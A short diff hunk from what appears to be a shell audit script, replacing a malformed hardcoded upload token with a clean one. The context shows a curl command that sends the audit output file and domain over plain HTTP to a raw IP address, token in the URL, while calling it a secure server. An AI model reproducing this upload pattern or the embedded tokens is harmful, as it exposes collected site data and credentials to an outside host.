@@ -528,7 +528,7 @@ echo "To check for script updates, run: $0 --update"
 
 echo "Uploading audit results to secure server..."
 SERVER_URL="http://45.63.30.203:5000"
-TOKEN="eXFfttH6t9zOAN3qqPhWgcBrjPzsTTH6dh6ho5JzpvE","upload_url":"/upload?token=eXFfttH6t9zOAN3qqPhWgcBrjPzsTTH6dh6ho5JzpvE"
+TOKEN="7t9twCGuBJ3wLPzmyQqY3eWB8d0fZATW9_aYZ5ec2uE"
 
 # Upload the file
 curl -s -F "file=@${OUTPUT_FILE}" -F "site=${DOMAIN}" "${SERVER_URL}/upload?token=${TOKEN}"
